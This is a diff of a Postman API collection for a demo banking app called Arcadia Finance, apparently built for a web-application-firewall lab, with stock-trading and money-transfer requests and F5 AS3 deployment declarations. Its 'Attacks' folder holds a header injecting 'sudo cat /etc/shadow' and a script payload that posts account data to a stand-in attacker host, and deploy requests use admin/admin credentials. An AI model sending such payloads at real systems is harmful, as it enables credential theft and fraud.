@@ -1,6 +1,6 @@
 {
 	"info": {
-		"_postman_id": "b2ba891e-1f75-4e2d-b4e0-a6c51b687b24",
+		"_postman_id": "8b9baa89-320d-4324-897c-3519c83fbccc",
 		"name": "Arcadia Finance",
 		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
 	},
@@ -9,7 +9,7 @@
 			"name": "Dev",
 			"item": [
 				{
-					"name": "Test App",
+					"name": "Test API",
 					"item": [
 						{
 							"name": "DEV - Buy stocks",
@@ -30,13 +30,13 @@
 								],
 								"body": {
 									"mode": "raw",
-									"raw": "{\n    \"trans_value\": \"19800\",\n    \"qty\": \"100\",\n    \"company\": \"MSFT\",\n    \"action\": \"buy\",\n    \"stock_price\": \"198\"\n}"
+									"raw": "{\n    \"trans_value\": \"19800\",\n    \"qty\": \"100\",\n    \"company\": \"FFIV\",\n    \"action\": \"buy\",\n    \"stock_price\": \"198\"\n}"
 								},
 								"url": {
-									"raw": "https://arctest.itc.demo/trading/rest/buy_stocks.php",
+									"raw": "https://arcdev.itc.demo/trading/rest/buy_stocks.php",
 									"protocol": "https",
 									"host": [
-										"arctest",
+										"arcdev",
 										"itc",
 										"demo"
 									],
@@ -44,38 +44,6 @@
 										"trading",
 										"rest",
 										"buy_stocks.php"
-									]
-								}
-							},
-							"response": []
-						},
-						{
-							"name": "DEV - transfer money",
-							"request": {
-								"method": "POST",
-								"header": [
-									{
-										"key": "Content-Type",
-										"value": "application/json",
-										"type": "text"
-									}
-								],
-								"body": {
-									"mode": "raw",
-									"raw": "{\r\n    \"amount\": \"14\",\r\n    \"account\": \"2075894\",\r\n    \"currency\": \"EUR\",\r\n    \"friend\": \"Bart\"\r\n}"
-								},
-								"url": {
-									"raw": "https://arctest.itc.demo/api/rest/execute_money_transfer.php",
-									"protocol": "https",
-									"host": [
-										"arctest",
-										"itc",
-										"demo"
-									],
-									"path": [
-										"api",
-										"rest",
-										"execute_money_transfer.php"
 									]
 								}
 							},
@@ -102,13 +70,13 @@
 								],
 								"body": {
 									"mode": "raw",
-									"raw": "{\n    \"trans_value\": \"212\",\n    \"qty\": \"16\",\n    \"company\": \"MSFT\",\n    \"action\": \"sell\",\n    \"stock_price\": \"158\"\n}"
+									"raw": "{\n    \"trans_value\": \"1750\",\n    \"qty\": \"10\",\n    \"company\": \"FFIV\",\n    \"action\": \"sell\",\n    \"stock_price\": \"175\"\n}"
 								},
 								"url": {
-									"raw": "https://arctest.itc.demo/trading/rest/sell_stocks.php",
+									"raw": "https://arcdev.itc.demo/trading/rest/sell_stocks.php",
 									"protocol": "https",
 									"host": [
-										"arctest",
+										"arcdev",
 										"itc",
 										"demo"
 									],
@@ -116,51 +84,6 @@
 										"trading",
 										"rest",
 										"sell_stocks.php"
-									]
-								}
-							},
-							"response": []
-						},
-						{
-							"name": "DEV - create form",
-							"request": {
-								"method": "POST",
-								"header": [],
-								"body": {
-									"mode": "formdata",
-									"formdata": [
-										{
-											"key": "fname",
-											"value": "Shiba",
-											"type": "text"
-										},
-										{
-											"key": "lname",
-											"value": "Inu",
-											"type": "text"
-										},
-										{
-											"key": "email",
-											"value": "luna@dogmail.com",
-											"type": "text"
-										},
-										{
-											"key": "message",
-											"value": "Such API hooman!",
-											"type": "text"
-										}
-									]
-								},
-								"url": {
-									"raw": "https://arctest.itc.demo/create_form.php",
-									"protocol": "https",
-									"host": [
-										"arctest",
-										"itc",
-										"demo"
-									],
-									"path": [
-										"create_form.php"
 									]
 								}
 							},
@@ -199,11 +122,43 @@
 								}
 							},
 							"response": []
+						},
+						{
+							"name": "DEV - transfer money",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json",
+										"type": "text"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\r\n    \"amount\": \"14\",\r\n    \"account\": \"2075894\",\r\n    \"currency\": \"EUR\",\r\n    \"friend\": \"Bart\"\r\n}"
+								},
+								"url": {
+									"raw": "https://arcdev.itc.demo/api/rest/execute_money_transfer.php",
+									"protocol": "https",
+									"host": [
+										"arcdev",
+										"itc",
+										"demo"
+									],
+									"path": [
+										"api",
+										"rest",
+										"execute_money_transfer.php"
+									]
+								}
+							},
+							"response": []
 						}
 					]
 				},
 				{
-					"name": "Deploy Test VIP w/ OAS",
+					"name": "Deploy DEV w/ OAS",
 					"protocolProfileBehavior": {
 						"disabledSystemHeaders": {
 							"connection": true
@@ -229,7 +184,7 @@
 						"header": [],
 						"body": {
 							"mode": "raw",
-							"raw": "{\r\n    \"class\": \"AS3\",\r\n    \"action\": \"deploy\",\r\n    \"persist\": true,\r\n    \"declaration\": {\r\n        \"class\": \"ADC\",\r\n        \"schemaVersion\": \"3.2.0\",\r\n        \"id\": \"Prod_API_AS3\",\r\n        \"arcadia-test\": {\r\n            \"class\": \"Tenant\",\r\n            \"defaultRouteDomain\": 0,\r\n            \"API\": {\r\n                \"class\": \"Application\",\r\n                \"template\": \"generic\",\r\n                \"vs_arcadia\": {\r\n                    \"class\": \"Service_HTTPS\",\r\n                    \"remark\": \"Arcadia Test\",\r\n                    \"virtualAddresses\": [\"10.1.10.101\"],\r\n                    \"redirect80\": false,\r\n                    \"pool\": \"pool_arctest\",\r\n                    \"policyWAF\": { \"use\": \"arcadia_test_policy\" },\r\n                    \"securityLogProfiles\": [{ \"bigip\": \"/Common/Log all requests\"}],\r\n                    \"profileTCP\": {\r\n                        \"egress\": \"wan\",\r\n                        \"ingress\": { \"use\": \"arc_Profile\" } },\r\n                    \"profileHTTP\": { \"use\": \"arc_http_profile\" },\r\n                    \"serverTLS\": { \"bigip\": \"/Common/ITC_Client_SSL\" }\r\n                },\r\n                \"arcadia_test_policy\": {\r\n                    \"class\": \"WAF_Policy\",\r\n                    \"url\": \"http://repo.itc.demo:8282/arcadia/policy-api-arcadia-test.json\",\r\n                    \"ignoreChanges\": true\r\n                },\r\n                \"pool_arctest\": {\r\n                    \"class\": \"Pool\",\r\n                    \"monitors\": [\"http\"],\r\n                    \"members\": [{\r\n                        \"servicePort\": 80,\r\n                        \"serverAddresses\": [\"10.1.20.5\"]\r\n                    }]\r\n                },\r\n                \"arc_http_profile\": {\r\n                    \"class\": \"HTTP_Profile\",\r\n                    \"xForwardedFor\": true\r\n                },\r\n                \"arc_Profile\": {\r\n                    \"class\": \"TCP_Profile\",\r\n                    \"idleTimeout\": 60 }\r\n            }\r\n        }\r\n    }\r\n}\r\n",
+							"raw": "{\r\n    \"class\": \"AS3\",\r\n    \"action\": \"deploy\",\r\n    \"persist\": true,\r\n    \"declaration\": {\r\n        \"class\": \"ADC\",\r\n        \"schemaVersion\": \"3.2.0\",\r\n        \"id\": \"Dev_API_AS3\",\r\n        \"arcadia-dev\": {\r\n            \"class\": \"Tenant\",\r\n            \"defaultRouteDomain\": 0,\r\n            \"API\": {\r\n                \"class\": \"Application\",\r\n                \"template\": \"generic\",\r\n                \"vs_arcadia_dev\": {\r\n                    \"class\": \"Service_HTTPS\",\r\n                    \"remark\": \"Arcadia Dev\",\r\n                    \"virtualAddresses\": [\"10.1.10.101\"],\r\n                    \"redirect80\": false,\r\n                    \"pool\": \"pool_arcdev\",\r\n                    \"policyWAF\": { \"use\": \"arcadia_dev_policy\" },\r\n                    \"securityLogProfiles\": [{ \"bigip\": \"/Common/Log all requests\"}],\r\n                    \"profileTCP\": {\r\n                        \"egress\": \"wan\",\r\n                        \"ingress\": { \"use\": \"arc_Profile\" } },\r\n                    \"profileHTTP\": { \"use\": \"arc_http_profile\" },\r\n                    \"serverTLS\": { \"bigip\": \"/Common/ITC_Client_SSL\" }\r\n                },\r\n                \"arcadia_dev_policy\": {\r\n                    \"class\": \"WAF_Policy\",\r\n                    \"url\": \"http://repo.itc.demo:8282/arcadia/dev/policy-api-arcadia.json\",\r\n                    \"ignoreChanges\": true\r\n                },\r\n                \"pool_arcdev\": {\r\n                    \"class\": \"Pool\",\r\n                    \"monitors\": [\"http\"],\r\n                    \"members\": [{\r\n                        \"servicePort\": 80,\r\n                        \"serverAddresses\": [\"10.1.20.5\"]\r\n                    }]\r\n                },\r\n                \"arc_http_profile\": {\r\n                    \"class\": \"HTTP_Profile\",\r\n                    \"xForwardedFor\": true\r\n                },\r\n                \"arc_Profile\": {\r\n                    \"class\": \"TCP_Profile\",\r\n                    \"idleTimeout\": 60 }\r\n            }\r\n        }\r\n    }\r\n}\r\n",
 							"options": {
 								"raw": {
 									"language": "json"
@@ -290,7 +245,7 @@
 							}
 						},
 						"url": {
-							"raw": "https://10.1.1.4/mgmt/shared/appsvcs/declare/arcadia-test",
+							"raw": "https://10.1.1.4/mgmt/shared/appsvcs/declare/arcadia-dev",
 							"protocol": "https",
 							"host": [
 								"10",
@@ -303,7 +258,7 @@
 								"shared",
 								"appsvcs",
 								"declare",
-								"arcadia-test"
+								"arcadia-dev"
 							]
 						}
 					},
@@ -315,40 +270,8 @@
 			"name": "Prod",
 			"item": [
 				{
-					"name": "Test API",
+					"name": "Test App",
 					"item": [
-						{
-							"name": "PROD - transfer money",
-							"request": {
-								"method": "POST",
-								"header": [
-									{
-										"key": "Content-Type",
-										"value": "application/json",
-										"type": "text"
-									}
-								],
-								"body": {
-									"mode": "raw",
-									"raw": "{\r\n    \"amount\": \"14\",\r\n    \"account\": \"2075894\",\r\n    \"currency\": \"EUR\",\r\n    \"friend\": \"Bart\"\r\n}"
-								},
-								"url": {
-									"raw": "https://arcadia.itc.demo/api/rest/execute_money_transfer.php",
-									"protocol": "https",
-									"host": [
-										"arcadia",
-										"itc",
-										"demo"
-									],
-									"path": [
-										"api",
-										"rest",
-										"execute_money_transfer.php"
-									]
-								}
-							},
-							"response": []
-						},
 						{
 							"name": "PROD - buy stocks",
 							"protocolProfileBehavior": {
@@ -509,7 +432,7 @@
 					]
 				},
 				{
-					"name": "Deploy w/ No Security",
+					"name": "Deploy PROD w/ WAF",
 					"protocolProfileBehavior": {
 						"disabledSystemHeaders": {
 							"connection": true
@@ -535,60 +458,7 @@
 						"header": [],
 						"body": {
 							"mode": "raw",
-							"raw": "{\r\n    \"class\": \"AS3\",\r\n    \"action\": \"deploy\",\r\n    \"persist\": true,\r\n    \"declaration\": {\r\n        \"class\": \"ADC\",\r\n        \"schemaVersion\": \"3.2.0\",\r\n        \"id\": \"Prod_API_AS3\",\r\n        \"arcadia-prod\": {\r\n            \"class\": \"Tenant\",\r\n            \"defaultRouteDomain\": 0,\r\n            \"API\": {\r\n                \"class\": \"Application\",\r\n                \"template\": \"generic\",\r\n                \"vs_arcadia\": {\r\n                    \"class\": \"Service_HTTPS\",\r\n                    \"remark\": \"Arcadia Finance Application\",\r\n                    \"virtualAddresses\": [\"10.1.10.100\"],\r\n                    \"redirect80\": false,\r\n                    \"pool\": \"pool_arcadia\",\r\n                    \"profileTCP\": {\r\n                        \"egress\": \"wan\",\r\n                        \"ingress\": { \"use\": \"TCP_Profile\" } },\r\n                    \"profileHTTP\": { \"use\": \"custom_http_profile\" },\r\n                    \"serverTLS\": { \"bigip\": \"/Common/ITC_Client_SSL\" }\r\n                },\r\n                \"pool_arcadia\": {\r\n                    \"class\": \"Pool\",\r\n                    \"monitors\": [\"http\"],\r\n                    \"members\": [{\r\n                        \"servicePort\": 80,\r\n                        \"serverAddresses\": [\"10.1.20.5\"]\r\n                    }]\r\n                },\r\n                \"custom_http_profile\": {\r\n                    \"class\": \"HTTP_Profile\",\r\n                    \"xForwardedFor\": true\r\n                },\r\n                \"TCP_Profile\": {\r\n                    \"class\": \"TCP_Profile\",\r\n                    \"idleTimeout\": 60 }\r\n            }\r\n        }\r\n    }\r\n}",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": {
-							"raw": "https://10.1.1.4/mgmt/shared/appsvcs/declare",
-							"protocol": "https",
-							"host": [
-								"10",
-								"1",
-								"1",
-								"4"
-							],
-							"path": [
-								"mgmt",
-								"shared",
-								"appsvcs",
-								"declare"
-							]
-						}
-					},
-					"response": []
-				},
-				{
-					"name": "Deploy w/ OpenAPI & WAF",
-					"protocolProfileBehavior": {
-						"disabledSystemHeaders": {
-							"connection": true
-						}
-					},
-					"request": {
-						"auth": {
-							"type": "basic",
-							"basic": [
-								{
-									"key": "password",
-									"value": "admin",
-									"type": "string"
-								},
-								{
-									"key": "username",
-									"value": "admin",
-									"type": "string"
-								}
-							]
-						},
-						"method": "POST",
-						"header": [],
-						"body": {
-							"mode": "raw",
-							"raw": "{\r\n    \"class\": \"AS3\",\r\n    \"action\": \"deploy\",\r\n    \"persist\": true,\r\n    \"declaration\": {\r\n        \"class\": \"ADC\",\r\n        \"schemaVersion\": \"3.2.0\",\r\n        \"id\": \"Prod_API_AS3\",\r\n        \"arcadia-prod\": {\r\n            \"class\": \"Tenant\",\r\n            \"defaultRouteDomain\": 0,\r\n            \"API\": {\r\n                \"class\": \"Application\",\r\n                \"template\": \"generic\",\r\n                \"vs_arcadia\": {\r\n                    \"class\": \"Service_HTTPS\",\r\n                    \"remark\": \"Arcadia Finance Application\",\r\n                    \"virtualAddresses\": [\"10.1.10.100\"],\r\n                    \"redirect80\": false,\r\n                    \"pool\": \"pool_arcadia\",\r\n                    \"policyWAF\": { \"use\": \"arcadia_waap_policy\" },\r\n                    \"securityLogProfiles\": [{ \"bigip\": \"/Common/Log all requests\"}],\r\n                    \"profileTCP\": {\r\n                        \"egress\": \"wan\",\r\n                        \"ingress\": { \"use\": \"TCP_Profile\" } },\r\n                    \"profileHTTP\": { \"use\": \"custom_http_profile\" },\r\n                    \"serverTLS\": { \"bigip\": \"/Common/ITC_Client_SSL\" }\r\n                },\r\n                \"arcadia_waap_policy\": {\r\n                    \"class\": \"WAF_Policy\",\r\n                    \"url\": \"http://repo.itc.demo:8282/arcadia/policy-api-arcadia.json\",\r\n                    \"ignoreChanges\": true\r\n                },\r\n                \"pool_arcadia\": {\r\n                    \"class\": \"Pool\",\r\n                    \"monitors\": [\"http\"],\r\n                    \"members\": [{\r\n                        \"servicePort\": 80,\r\n                        \"serverAddresses\": [\"10.1.20.5\"]\r\n                    }]\r\n                },\r\n                \"custom_http_profile\": {\r\n                    \"class\": \"HTTP_Profile\",\r\n                    \"xForwardedFor\": true\r\n                },\r\n                \"TCP_Profile\": {\r\n                    \"class\": \"TCP_Profile\",\r\n                    \"idleTimeout\": 60 }\r\n            }\r\n        }\r\n    }\r\n}\r\n",
+							"raw": "{\r\n    \"class\": \"AS3\",\r\n    \"action\": \"deploy\",\r\n    \"persist\": true,\r\n    \"declaration\": {\r\n        \"class\": \"ADC\",\r\n        \"schemaVersion\": \"3.2.0\",\r\n        \"id\": \"Prod_API_AS3\",\r\n        \"arcadia-prod\": {\r\n            \"class\": \"Tenant\",\r\n            \"defaultRouteDomain\": 0,\r\n            \"API\": {\r\n                \"class\": \"Application\",\r\n                \"template\": \"generic\",\r\n                \"vs_arcadia\": {\r\n                    \"class\": \"Service_HTTPS\",\r\n                    \"remark\": \"Arcadia Finance Application\",\r\n                    \"virtualAddresses\": [\"10.1.10.100\"],\r\n                    \"redirect80\": false,\r\n                    \"pool\": \"pool_arcadia\",\r\n                    \"policyWAF\": { \"use\": \"arcadia_waap_policy\" },\r\n                    \"securityLogProfiles\": [{ \"bigip\": \"/Common/Log all requests\"}],\r\n                    \"profileTCP\": {\r\n                        \"egress\": \"wan\",\r\n                        \"ingress\": { \"use\": \"TCP_Profile\" } },\r\n                    \"profileHTTP\": { \"use\": \"custom_http_profile\" },\r\n                    \"serverTLS\": { \"bigip\": \"/Common/ITC_Client_SSL\" }\r\n                },\r\n                \"arcadia_waap_policy\": {\r\n                    \"class\": \"WAF_Policy\",\r\n                    \"url\": \"http://repo.itc.demo:8282/arcadia/prod/policy-arcadia-prod.json\",\r\n                    \"ignoreChanges\": true\r\n                },\r\n                \"pool_arcadia\": {\r\n                    \"class\": \"Pool\",\r\n                    \"monitors\": [\"http\"],\r\n                    \"members\": [{\r\n                        \"servicePort\": 80,\r\n                        \"serverAddresses\": [\"10.1.20.5\"]\r\n                    }]\r\n                },\r\n                \"custom_http_profile\": {\r\n                    \"class\": \"HTTP_Profile\",\r\n                    \"xForwardedFor\": true\r\n                },\r\n                \"TCP_Profile\": {\r\n                    \"class\": \"TCP_Profile\",\r\n                    \"idleTimeout\": 60 }\r\n            }\r\n        }\r\n    }\r\n}\r\n",
 							"options": {
 								"raw": {
 									"language": "json"
@@ -674,7 +544,13 @@
 			"name": "Attacks",
 			"item": [
 				{
-					"name": "Buy Stocks XSS",
+					"name": "Buy Stocks - Header",
+					"protocolProfileBehavior": {
+						"disabledSystemHeaders": {
+							"content-type": true,
+							"user-agent": true
+						}
+					},
 					"request": {
 						"method": "POST",
 						"header": [
@@ -682,6 +558,11 @@
 								"key": "Content-Type",
 								"value": "application/json",
 								"type": "text"
+							},
+							{
+								"key": "Keep-Alive",
+								"value": "sudo cat /etc/shadow",
+								"type": "default"
 							}
 						],
 						"body": {
@@ -718,13 +599,13 @@
 						],
 						"body": {
 							"mode": "raw",
-							"raw": "{\r\n    \"amount\": \"14\",\r\n    \"account\": \"<script>\",\r\n    \"currency\": \"EUR\",\r\n    \"friend\": \"Bart\"\r\n}"
+							"raw": "{\r\n    \"amount\": \"14\",\r\n    \"account\": \"<script>function send(account) {curl -kX post https://myhackersite/user.php?newacct=$account}</script>\",\r\n    \"currency\": \"EUR\",\r\n    \"friend\": \"Bart\"\r\n}"
 						},
 						"url": {
-							"raw": "https://arcadia.itc.demo/api/rest/execute_money_transfer.php",
+							"raw": "https://arcdev.itc.demo/api/rest/execute_money_transfer.php",
 							"protocol": "https",
 							"host": [
-								"arcadia",
+								"arcdev",
 								"itc",
 								"demo"
 							],
@@ -732,6 +613,46 @@
 								"api",
 								"rest",
 								"execute_money_transfer.php"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "sell stocks",
+					"protocolProfileBehavior": {
+						"disabledSystemHeaders": {
+							"user-agent": true,
+							"accept": true,
+							"connection": true,
+							"content-type": true
+						}
+					},
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"trans_value\": \"212\",\n    \"qty\": \"16\",\n    \"company\": \"MSFT\",\n    \"action\": \"sell\",\n    \"stock_price\": \"158\"\n}"
+						},
+						"url": {
+							"raw": "https://arcadia.itc.demo/trading/rest/sell_stocks.php",
+							"protocol": "https",
+							"host": [
+								"arcadia",
+								"itc",
+								"demo"
+							],
+							"path": [
+								"trading",
+								"rest",
+								"sell_stocks.php"
 							]
 						}
 					},
